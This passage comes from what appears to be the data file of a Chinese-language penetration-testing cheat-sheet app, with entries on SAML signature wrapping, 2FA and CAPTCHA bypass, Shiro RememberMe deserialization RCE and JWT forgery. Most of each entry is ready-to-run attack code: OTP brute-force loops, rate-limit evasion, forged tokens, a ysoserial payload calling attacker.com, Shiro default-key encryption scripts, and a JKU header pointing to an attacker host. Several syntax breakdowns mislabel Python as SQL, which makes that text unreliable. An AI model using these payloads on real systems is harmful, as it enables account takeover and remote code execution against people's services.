# 使用SAML Raider (Burp插件):
# - 拦截SAMLResponse
# - 选择XSW攻击类型(1-8)
# - 修改NameID为admin
# - 重放

# 2. 签名排除(如果SP不验证签名):
# 删除XML中的<ds:Signature>整个节点
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#" \
  -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. 自签名证书替换:
# 生成自签名证书:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048 \
  -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# 使用xmlsec1签名:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment注入绕过:
# admin<!-- -->@target.com 可能被解析为 admin@target.com
# 在NameID中注入: admin@target.com<!---->.evil.com`,
        description: 'SAML签名绕过的多种高级技术',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'XSW', explanation: 'XML Signature Wrapping，移动已签名节点位置并注入恶意节点', type: 'value' },
          { part: 'xmlsec1 --sign', explanation: '使用自签名证书重新签名SAML断言', type: 'command' },
          { part: 'Comment注入', explanation: '利用XML注释截断NameID值', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'SAML XML混淆绕过WAF',
        command: `# 1. XML编码混淆:
# 使用CDATA段包裹payload:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. DTD定义实体:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML命名空间混淆:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. 编码SAMLResponse的不同方式:
# 标准Base64:
cat saml.xml | base64 -w0
# 带换行的Base64:
cat saml.xml | base64
# URL编码后的Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64(某些实现接受):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"`,
            syntaxBreakdown: [
              { part: '# 1. XML编码混淆:\n# 使用CDATA段包裹payload:\n<NameID><![CDATA[admin@ta', explanation: 'XML内容', type: 'value' },
              { part: '<!DOCTYPE foo [<!ENTITY user "admin@target.com">', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: ']>\n<NameID>&user;</NameID>\n\n# 3. XML命名空间混淆:\n<saml:NameID xml', explanation: 'XML内容', type: 'value' }
            ],
        description: 'XML编码混淆和多种格式变体绕过WAF对SAML的检测',
        platform: 'linux',
      },
    ],
    tutorial: {
      overview: 'SAML认证漏洞涉及SAML断言的签名绕过、XML签名包装(XSW)攻击、断言注入、重放攻击等高级攻击手法，可在企业SSO环境中实现身份伪造，以任意用户身份登录受SAML保护的应用系统，影响范围通常涵盖整个企业应用生态',
      vulnerability: 'SAML实现的常见安全缺陷：XML签名验证不严格(仅验证签名存在而不验证签名覆盖的元素)、易受XML签名包装攻击(XSW，移动签名位置使其验证不同于实际使用的断言元素)、未校验断言的Recipient/Audience/NotOnOrAfter属性、断言可被重放、XML注释注入绕过属性解析',
      exploitation: '首先截获正常SAML认证流程中的SAMLResponse(Base64解码获取XML)，分析签名覆盖范围和断言结构。测试XSW攻击：复制合法签名引用的元素，在断言中插入伪造的用户身份，使签名验证通过但SP使用伪造的断言。测试XML注释注入：在NameID中插入注释截断用户名(如admin<!--x]-->@evil.com)。测试断言重放和过期校验',
      mitigation: '使用经过安全审计的SAML库(如OneLogin/OASIS参考实现)；验证XML签名时确保签名覆盖实际使用的断言元素；严格校验Audience、Recipient、NotOnOrAfter等属性；实施断言唯一ID防重放机制；对SAML响应实施XML Schema验证防止注入；启用加密断言保护传输安全',
      difficulty: 'advanced'
    }
  },
  {
    id: 'auth-2fa',
    name: '2FA绕过',
    description: '绕过双因素认证',
    category: '认证漏洞',
    subCategory: '2FA',
    tags: ['auth', '2fa', 'mfa'],
    prerequisites: ['开启2FA'],
    execution: [
      {
        title: '直接访问',
        command: `# 2FA绕过 - 强制浏览(直接跳过验证步骤):
# 1. 正常登录输入用户名密码，到达2FA验证页面
# 2. 不输入验证码，直接访问后台页面:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. 修改前端JS跳过验证:
# 在浏览器Console中执行:
# window.location = '/dashboard'

# 4. 修改响应中的验证状态:
# Burp拦截响应: {"2fa_required":true} → {"2fa_required":false}

# 5. 直接调用API(可能不检查2FA状态):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v`,
        description: '强制浏览绕过2FA页面',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'URL', explanation: '受保护页面', type: 'path' },
        ]
      },
      {
        title: '验证码爆破',
        command: `# 2FA验证码爆破:
# 1. TOTP通常为6位数字(000000-999999):
# 但有30秒时间窗口，需要极快速爆破

# 2. 短信验证码爆破(4位):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. 检测速率限制:
# 快速发送10次请求，观察是否被限制
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \\
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. 绕过速率限制:
# X-Forwarded-For IP轮换
# 修改User-Agent
# 添加空字节: otp=1234%00`,
        description: '无速率限制',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'OTP', explanation: '一次性密码', type: 'parameter' },
        ]
      },
      {
        title: '逻辑绕过',
        command: `response=true / success=1`,
        description: '修改响应包',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'response', explanation: 'API响应字段', type: 'json' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '响应篡改与直接端点访问',
        command: `# 响应篡改(Burp拦截):
# 原始响应: {"success":false,"message":"Invalid OTP"}
# 修改为:   {"success":true,"message":"Valid OTP"}

# 直接跳过2FA步骤:
# 登录后不访问/verify-2fa，直接访问:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# 修改状态参数:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true`,
            syntaxBreakdown: [
              { part: '# 响应篡改(Burp拦截):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
        description: '通过拦截并修改2FA验证响应包欺骗前端认为验证通过，或绕过2FA页面直接访问受保护端点测试服务端是否强制校验2FA状态',
      },
      {
        title: '备份码爆破与验证竞态条件',
        command: `# 备份码爆破(通常为8位数字/字母):
# 使用Burp Intruder对backup_code参数进行爆破
POST /verify-backup-code
{"backup_code":"§12345678§"}
# 检查速率限制和锁定策略

# 竞态条件(Race Condition):
# 同时发送多个验证请求:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa" \
    -b "session=SID" -d "otp=$i" &
done
wait
# 多线程并发可能绕过速率限制`,
            syntaxBreakdown: [
              { part: '# 备份码爆破(通常为8位数字/字母):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
        description: '对2FA备份恢复码进行字典爆破(通常限制不如OTP严格)，利用竞态条件并发发送多个OTP验证请求绕过速率限制',
      },
    ],
    tutorial: {
      overview: '双因素认证(2FA)绕过技术针对TOTP、SMS短信、邮箱验证码等第二因素认证机制的实现缺陷，通过逻辑漏洞、暴力破解、响应篡改、直接跳步等方式绕过2FA保护。成功绕过意味着账号安全回退到仅密码保护的水平',
      vulnerability: '2FA实现的常见缺陷：验证码位数不足(4-6位)且无频率限制导致可暴力破解、2FA验证步骤可被跳过(直接访问认证后页面)、验证码未与会话绑定(可用A账号的验证码验证B账号)、备用恢复码生成算法可预测、验证成功/失败的响应可在客户端被篡改、2FA状态存储在Cookie中可被删除重置',
      exploitation: '首先测试直接跳步：完成密码验证后不输入2FA码直接访问认证后页面。测试暴力破解：分析验证码位数和失败后的响应(是否有频率限制)。测试响应篡改：拦截2FA验证的响应，将失败响应修改为成功。测试会话绑定：使用A账号的有效验证码尝试验证B账号。测试备用码：分析恢复码格式和生成算法是否可预测',
      mitigation: '验证码至少6位并限制每日尝试次数(如5次后锁定)；2FA验证状态在服务端强制校验，不依赖客户端Cookie或响应内容；验证码与特定会话和用户严格绑定；备用恢复码使用加密安全随机数生成；实施延迟递增策略(每次失败增加等待时间)；关键操作要求重新验证2FA',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'auth-captcha',
    name: '验证码绕过',
    description: '绕过图形验证码',
    category: '认证漏洞',
    subCategory: '验证码',
    tags: ['auth', 'captcha', 'bypass'],
    prerequisites: ['存在验证码'],
    execution: [
      {
        title: '重复使用',
        command: `# 验证码重放攻击(一次验证,多次使用):
# 1. 正常获取并输入正确验证码
# 2. 在Burp中抓取成功的请求
# 3. 将请求发送到Repeater，重复发送:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. 如果每次响应都正常(非"验证码错误")
#    说明验证码未一次性失效，可用于暴力破解

# 5. 配合Intruder进行密码爆破:
# Positions: password字段
# Payloads: 密码字典
# 固定captcha字段为已知有效值

# Burp Intruder设置: Sniper模式，Payload为密码列表`,
        description: '验证码未一次性失效',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'captcha', explanation: '验证码参数', type: 'parameter' },
        ]
      },
      {
        title: '空值绕过',
        command: `# 验证码空值/参数删除绕过:
# 1. 提交空验证码:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. 提交null值:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. 完全删除captcha参数:
POST /login HTTP/1.1

username=admin&password=test

# 4. 提交特殊值:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. 不同编码:
captcha=%00
captcha=%20

# 如果任一方式登录成功，说明验证码验证可被绕过`,
        description: '验证码参数留空',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'empty', explanation: '空值', type: 'value' },
        ]
      },
      {
        title: '删除参数',
        command: `# 验证码参数移除绕过:
# 1. 原始请求(带验证码):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. 在Burp Repeater中删除captcha参数:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. 修改Content-Type测试(可能走不同处理逻辑):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. 通过移动端API(可能无验证码):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. 旧版本API(可能无验证码):
POST /api/v1/login HTTP/1.1`,
        description: '后端未检查参数存在性',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'remove', explanation: '移除参数', type: 'technique' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '会话复用与参数移除绕过',
        command: `# 会话复用(验证码未一次性失效):
# 1. 正确输入验证码一次
# 2. 后续请求继续使用相同captcha值
# Burp Repeater重放同一captcha参数

# 删除captcha参数:
# 原始: user=admin&pass=123&captcha=ABCD
# 修改: user=admin&pass=123
# 后端可能不校验缺失的参数

# 空值绕过:
captcha=
captcha=null
captcha=undefined
captcha[]=`,
            syntaxBreakdown: [
              { part: '# 会话复用(验证码未一次性失效):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
        description: '测试验证码是否在使用后立即失效(可重复使用)，删除captcha参数检查后端是否强制校验，或传入空值、数组等异常类型绕过类型检查',
      },
      {
        title: 'OCR识别与音频验证码利用',
        command: `# OCR自动识别图形验证码:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# 音频验证码利用:
# 使用Google Speech-to-Text API识别音频验证码
# 或使用Selenium自动获取+语音识别

# 验证码响应泄露:
# 检查响应头、Cookie、隐藏字段中是否包含验证码值
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"`,
            syntaxBreakdown: [
              { part: '# OCR自动识别图形验证码:\n# Python + Tesseract:\nimport pytesseract\n', explanation: 'SQL表达式', type: 'value' },
              { part: 'from', explanation: 'SQL关键字', type: 'keyword' },
              { part: ' PIL import Image\nimg = Image.open("captcha.png")\ntext = pytesseract.image_to_string(img)\nprint(text)\n\n# 音频验证码利用:\n# 使用Google Speech-to-Text API识别音频验证码\n# 或使用Selenium自动获取+语音识别\n\n# 验证码响应泄露:\n# 检查响应头、Cookie、隐藏字段中是否包含验证码值\ncurl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"', explanation: 'SQL表达式', type: 'value' }
            ],
        description: '使用OCR工具(Tesseract)自动识别简单图形验证码，利用音频验证码的语音识别替代方案，或检查响应中是否直接泄露验证码值',
      },
    ],
    tutorial: {
      overview: '验证码绕过技术针对图形验证码、滑块验证码、行为验证码等人机验证机制的实现缺陷，通过验证码复用、响应泄露、OCR识别、接口逻辑绕过等方式突破验证码防护，使暴力破解、自动化爬取、批量注册等攻击重新成为可能',
      vulnerability: '验证码实现的常见缺陷：验证码答案在HTTP响应中直接返回(隐藏字段或注释中)、验证码验证与业务请求未绑定(验证码和业务操作可分别发送)、验证码通过后的token可被复用(一次验证多次使用)、简单图形验证码可被OCR高精度识别、滑块验证码的验证参数可被直接构造',
      exploitation: '首先分析验证码的完整验证流程(前端生成/获取、用户输入、后端验证)。检查响应中是否泄露验证码答案(查看HTML源码、HTTP响应头、Cookie)。测试验证码是否可复用(使用已通过的验证码token重复提交业务请求)。测试删除验证码参数后请求是否仍可通过。对图形验证码尝试OCR识别(使用Tesseract等工具)。分析滑块验证码的请求参数是否可直接构造',
      mitigation: '验证码答案严格存储在服务端session中，禁止在响应中返回；验证码与业务请求使用同一次性token绑定，验证后立即失效；采用成熟的验证码服务(如reCAPTCHA/hCaptcha)提升识别难度；对失败请求实施指数退避延迟；结合IP信誉、设备指纹、行为分析等多维风控机制',
      difficulty: 'beginner'
    }
  },
  {
    id: 'auth-remember-me',
    name: '记住我漏洞',
    description: 'Remember Me功能漏洞',
    category: '认证漏洞',
    subCategory: '会话管理',
    tags: ['auth', 'remember-me', 'cookie'],
    prerequisites: ['开启Remember Me'],
    execution: [
      {
        title: 'Cookie伪造',
        command: `# Remember-Me Cookie伪造:
# 1. 分析Cookie结构:
# 常见格式: username|timestamp|hash 或 base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64解码分析:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# 输出: user:1699000000:abcd1234

# 3. 伪造admin的Cookie:
echo -n "admin:1999999999:abcd1234" | base64
# 用生成的值替换Cookie

# 4. 如果使用弱Hash(如MD5(username+secret)):
# 注册新账号 → 分析Cookie → 推导secret → 伪造admin Cookie

# 5. 测试:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v`,
        description: '明文存储用户名',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'remember', explanation: 'Remember Me Cookie', type: 'header' },
        ]
      },
      {
        title: 'Base64解码',
        command: `# Remember-Me Cookie解码与分析:
# 1. 提取Cookie值:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64解码:
echo "COOKIE_VALUE" | base64 -d

# 3. 如果是URL编码+Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. 尝试Hex解码:
echo "COOKIE_VALUE" | xxd -r -p

# 5. 分析解码后的结构:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# 序列化对象(Java/PHP)

# 6. 检查是否为已知框架的Cookie格式:
# Shiro: AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature`,
        description: '弱加密或编码',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Base64', explanation: '常见编码方式', type: 'encoding' },
        ]
      },
      {
        title: '记住密码Token逆向分析',
        command: `# 1. 收集多个remember-me Token:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1" \
    "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64解码分析:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20

# 3. 检查常见格式:
# username:timestamp:hash
# username:md5(password)
# serialized_object(Java: rO0AB... PHP: O:4:...)

# 4. 如果是Java序列化(Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3
# 如果以 aced0005 开头 → Java序列化对象
# 如果Token加密: 尝试Shiro默认密钥 kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP反序列化检查:
echo "REMEMBER_TOKEN" | base64 -d
# 如果形如 O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP序列化`,
        description: '逆向分析remember-me Token的生成逻辑',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'base64 -d | xxd', explanation: '解码Token并以十六进制查看结构', type: 'command' },
          { part: 'aced0005', explanation: 'Java序列化魔术字节，表示是Java对象', type: 'value' },
          { part: 'kPH+bIxk5D2deZiIxcaaaA==', explanation: 'Apache Shiro框架的默认AES密钥', type: 'value' },
        ]
      },
      {
        title: 'Shiro RememberMe反序列化RCE',
        command: `# Apache Shiro框架的RememberMe Cookie反序列化漏洞
# 原理: AES-CBC加密(默认密钥) → Base64编码 → Cookie

# 1. 检测Shiro框架:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# 发送无效Cookie触发特征响应:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. 已知Shiro密钥列表测试:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. 使用ShiroExploit工具:
# java -jar ShiroExploit.jar http://target.com

# 4. 手动构造payload(需要ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES加密:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"`,
        description: '利用Shiro默认密钥 + 反序列化链实现RCE',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ysoserial', explanation: 'Java反序列化payload生成工具', type: 'command' },
          { part: 'CommonsCollections2', explanation: '常用的反序列化利用链(Gadget Chain)', type: 'value' },
          { part: 'AES-CBC + PKCS5Padding', explanation: 'Shiro使用的加密方式', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'Remember-Me Cookie绕过检测',
        command: `# 1. 修改Cookie名称大小写:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro密钥枚举(使用不同密钥加密payload):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM模式(Shiro 1.4.2+):
# 新版Shiro使用AES-GCM，需要对应的加密方式`,
            syntaxBreakdown: [
              { part: '# 1. 修改Cookie名称大小写:\ncurl -b "RememberMe=payload" "http://target.com/"\ncurl -b "rememberme=payload" "http://target.com/"\ncurl -b "REMEMBERME=payload" "http://target.com/"\n\n# 2. Shiro密钥枚举(使用不同密钥加密payload):\nimport base64, itertools\n', explanation: 'SQL表达式', type: 'value' },
              { part: 'from', explanation: 'SQL关键字', type: 'keyword' },
              { part: ' Crypto.Cipher import AES\nimport os\n\nkeys = [\n    "kPH+bIxk5D2deZiIxcaaaA==",\n    "2AvVhdsgUs0FSA3SDFAdag==",\n    "3AvVhmFLUs0KTA3Kprsdag==",\n    "4AvVhmFLUs0KTA3Kprsdag==",\n    "Z3VucwAAAAAAAAAAAAAAAA==",\n    "wGiHplamyXlVB11UXWol8g==",\n    "fCq+/xW488hMTCD+cmJ3aQ==",\n]\n\npayload = open("payload.ser", "rb").read()\nfor k in keys:\n    try:\n        key = base64.b64decode(k)\n        iv = os.urandom(16)\n        pad = 16 - len(payload) % 16\n        padded = payload + bytes([pad]) * pad\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()\n        print(f"Key: {k} → Cookie length: {len(enc)}")\n    except Exception as e:\n        print(f"Key: {k} → Error: {e}")\n\n# 3. GCM模式(Shiro 1.4.2+):\n# 新版Shiro使用AES-GCM，需要对应的加密方式', explanation: 'SQL表达式', type: 'value' }
            ],
        description: '枚举Shiro密钥和不同加密模式绕过检测',
        platform: 'all',
      },
    ],
    tutorial: {
      overview: '"记住我"功能持久化登录漏洞涉及Remember-Me Cookie的生成算法可逆、密钥可预测、反序列化风险等安全问题。攻击者通过分析或伪造Remember-Me令牌可实现持久化身份冒充，典型案例包括Apache Shiro的RememberMe反序列化漏洞(CVE-2016-4437)',
      vulnerability: '"记住我"功能的常见缺陷：Cookie值使用可逆编码(如Base64)而非加密签名存储用户信息、加密密钥使用默认值或硬编码(如Shiro默认AES密钥)、Cookie反序列化Java/PHP对象导致RCE、Cookie未绑定客户端IP或设备指纹可被跨设备重放、Cookie有效期过长无法被强制撤销',
      exploitation: '首先获取Remember-Me Cookie值并分析其格式(Base64解码、十六进制查看)。检查是否为已知框架(如Shiro)的格式并测试默认密钥。分析Cookie是否包含可篡改的用户标识(如修改用户ID或角色字段)。对Java应用测试反序列化攻击(使用ysoserial生成payload替换Cookie内容)。测试Cookie是否可跨IP/设备重放',
      mitigation: '使用加密安全的随机令牌作为Remember-Me标识，不在Cookie中存储用户信息；修改框架默认加密密钥(如Shiro的rememberMe密钥)；禁止在Cookie中使用Java/PHP序列化对象；令牌绑定客户端指纹(IP+UA+设备ID)；设置合理有效期(建议不超过30天)；提供注销所有设备功能支持令牌吊销',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'auth-jwt',
    name: 'JWT认证漏洞',
    description: '利用JWT(JSON Web Token)实现缺陷伪造或篡改认证令牌，实现未授权访问或权限提升',
    category: '认证漏洞',
    subCategory: 'JWT',
    tags: ['auth', 'jwt', 'token'],
    prerequisites: ['目标使用JWT进行认证', '可以获取或拦截JWT令牌', 'JWT库存在已知漏洞或服务端配置不当'],
    execution: [
      {
        title: 'JWT解码与分析',
        command: `# 手动解码JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# 使用jwt_tool解码:
python3 jwt_tool.py <token>

# 在线解码:
# https://jwt.io/

# 检查关键字段:
# - alg: 签名算法(HS256/RS256/none)
# - kid: 密钥ID(可能可注入)
# - typ: 令牌类型
# - exp: 过期时间
# - role/admin/isAdmin: 权限字段`,
        description: '解码JWT的Header和Payload分析其结构和权限信息',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'cut -d. -f2', explanation: '以点号分割JWT取第二段(Payload)', type: 'command' },
          { part: 'base64 -d', explanation: 'Base64解码JWT段落', type: 'command' },
          { part: 'alg', explanation: 'JWT头部的算法字段，常见攻击点', type: 'value' },
          { part: 'kid', explanation: 'Key ID字段，可能存在SQL注入或路径遍历', type: 'value' },
        ]
      },
      {
        title: 'Algorithm None攻击',
        command: `# 将alg改为none绕过签名验证
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# 多种变体绕过:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# 使用jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack`,
        description: '将JWT的alg字段设为none，使服务端跳过签名验证，直接接受篡改的payload',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'alg: "none"', explanation: '将算法设为none，服务端可能跳过签名校验', type: 'value' },
          { part: 'rstrip(b"=")', explanation: '移除Base64 padding(JWT标准要求)', type: 'command' },
          { part: '-X a', explanation: 'jwt_tool的Algorithm None自动攻击模式', type: 'parameter' },
        ]
      },
      {
        title: 'HS256密钥爆破',
        command: `# 使用jwt_tool爆破弱密钥
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# 使用hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# 使用john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 常见弱密钥:
# secret, password, 123456, admin, key, test
# 公司名, 项目名, 域名等

# 密钥确认后伪造JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)`,
        description: '对使用HS256对称加密的JWT进行密钥字典爆破',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-C', explanation: 'jwt_tool的密钥爆破模式(Crack)', type: 'parameter' },
          { part: '-d', explanation: '指定字典文件路径', type: 'parameter' },
          { part: '-m 16500', explanation: 'hashcat中JWT的哈希模式编号', type: 'value' },
          { part: 'jwt.encode()', explanation: '使用破解的密钥伪造新JWT', type: 'command' },
        ]
      },
      {
        title: 'RS256→HS256算法混淆攻击',
        command: `# 当服务端使用RS256但接受HS256时:
# 1. 获取服务端公钥(通常在/.well-known/jwks.json或/api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. 提取公钥
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. 用公钥作为HS256的密钥签名JWT
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack`,
        description: '利用RS256/HS256算法混淆，用公钥作为HS256对称密钥签名伪造JWT',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/.well-known/jwks.json', explanation: 'JWT密钥集合的标准端点', type: 'value' },
          { part: 'openssl x509 -pubkey', explanation: '从证书中提取公钥', type: 'command' },
          { part: '-X k', explanation: 'jwt_tool的密钥混淆攻击模式', type: 'parameter' },
          { part: '-pk pubkey.pem', explanation: '指定公钥文件用于算法混淆', type: 'parameter' },
        ]
      },
      {
        title: 'KID参数注入',
        command: `# KID (Key ID) SQL注入:
# 原始header: {"alg":"HS256","kid":"key1"}
# 注入header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL注入方式:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# 路径遍历方式:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null内容为空，密钥为空字符串
token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""`,
        description: '利用JWT头部kid字段的SQL注入或路径遍历控制签名验证密钥',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'kid', explanation: 'JWT头部字段，指定服务端使用哪个密钥验证签名', type: 'value' },
          { part: 'UNION SELECT', explanation: 'SQL注入控制kid查询返回攻击者指定的密钥值', type: 'command' },
          { part: '../../dev/null', explanation: '路径遍历到空文件，使密钥为空字符串', type: 'value' },
          { part: '-X i', explanation: 'jwt_tool的注入攻击模式', type: 'parameter' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'JWK/JKU头部密钥注入',
        command: `# JWK内嵌密钥注入:
# 生成RSA密钥对:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 构造JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# 用attacker.key签名，服务端从jwk字段取公钥验证

# JKU远程密钥注入:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
